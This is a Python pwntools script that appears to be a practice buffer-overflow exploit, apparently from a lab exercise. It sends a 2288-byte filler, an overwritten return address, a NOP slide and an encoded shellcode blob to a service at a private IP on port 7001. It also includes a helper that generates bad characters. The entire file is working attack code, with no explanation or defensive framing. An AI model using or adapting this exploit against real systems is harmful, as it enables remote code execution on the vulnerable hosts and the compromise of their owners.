#!/usr/bin/python
from pwn import *

def detectbadChar():
    char = ""
    badchars = [0x00]
    for i in range(0x1, 0x100):
        if i not in badchars:
            char += chr(i)
    return char.encode()

try:
    host = "192.168.201.10"
    port = 7001
    
    filler = b"A" * 2288
    nop_slide = b"\x90" * 16
    eip = p32(0x148010cf)
    
    buf =  b""
    buf += b"\xbe\xc4\x97\xb1\xfa\xd9\xec\xd9\x74\x24\xf4\x5b"
    buf += b"\x2b\xc9\xb1\x52\x31\x73\x12\x83\xeb\xfc\x03\xb7"
    buf += b"\x99\x53\x0f\xcb\x4e\x11\xf0\x33\x8f\x76\x78\xd6"
    buf += b"\xbe\xb6\x1e\x93\x91\x06\x54\xf1\x1d\xec\x38\xe1"
    buf += b"\x96\x80\x94\x06\x1e\x2e\xc3\x29\x9f\x03\x37\x28"
    buf += b"\x23\x5e\x64\x8a\x1a\x91\x79\xcb\x5b\xcc\x70\x99"
    buf += b"\x34\x9a\x27\x0d\x30\xd6\xfb\xa6\x0a\xf6\x7b\x5b"
    buf += b"\xda\xf9\xaa\xca\x50\xa0\x6c\xed\xb5\xd8\x24\xf5"
    buf += b"\xda\xe5\xff\x8e\x29\x91\x01\x46\x60\x5a\xad\xa7"
    buf += b"\x4c\xa9\xaf\xe0\x6b\x52\xda\x18\x88\xef\xdd\xdf"
    buf += b"\xf2\x2b\x6b\xfb\x55\xbf\xcb\x27\x67\x6c\x8d\xac"
    buf += b"\x6b\xd9\xd9\xea\x6f\xdc\x0e\x81\x94\x55\xb1\x45"
    buf += b"\x1d\x2d\x96\x41\x45\xf5\xb7\xd0\x23\x58\xc7\x02"
    buf += b"\x8c\x05\x6d\x49\x21\x51\x1c\x10\x2e\x96\x2d\xaa"
    buf += b"\xae\xb0\x26\xd9\x9c\x1f\x9d\x75\xad\xe8\x3b\x82"
    buf += b"\xd2\xc2\xfc\x1c\x2d\xed\xfc\x35\xea\xb9\xac\x2d"
    buf += b"\xdb\xc1\x26\xad\xe4\x17\xe8\xfd\x4a\xc8\x49\xad"
    buf += b"\x2a\xb8\x21\xa7\xa4\xe7\x52\xc8\x6e\x80\xf9\x33"
    buf += b"\xf9\x6f\x55\x16\x17\x07\xa4\x68\xf7\x2f\x21\x8e"
    buf += b"\x9d\xdf\x64\x19\x0a\x79\x2d\xd1\xab\x86\xfb\x9c"
    buf += b"\xec\x0d\x08\x61\xa2\xe5\x65\x71\x53\x06\x30\x2b"
    buf += b"\xf2\x19\xee\x43\x98\x88\x75\x93\xd7\xb0\x21\xc4"
    buf += b"\xb0\x07\x38\x80\x2c\x31\x92\xb6\xac\xa7\xdd\x72"
    buf += b"\x6b\x14\xe3\x7b\xfe\x20\xc7\x6b\xc6\xa9\x43\xdf"
    buf += b"\x96\xff\x1d\x89\x50\x56\xec\x63\x0b\x05\xa6\xe3"
    buf += b"\xca\x65\x79\x75\xd3\xa3\x0f\x99\x62\x1a\x56\xa6"
    buf += b"\x4b\xca\x5e\xdf\xb1\x6a\xa0\x0a\x72\x9a\xeb\x16"
    buf += b"\xd3\x33\xb2\xc3\x61\x5e\x45\x3e\xa5\x67\xc6\xca"
    buf += b"\x56\x9c\xd6\xbf\x53\xd8\x50\x2c\x2e\x71\x35\x52"
    buf += b"\x9d\x72\x1c"
    
    buffer =  filler + eip + nop_slide + buf
 
    
    print("\nSending evil buffer...")
        
    
    r = remote(host, port)
    r.send(buffer)
    r.close()
  
    print("\nDone!")
  
except:
    print("\nCould not connect!")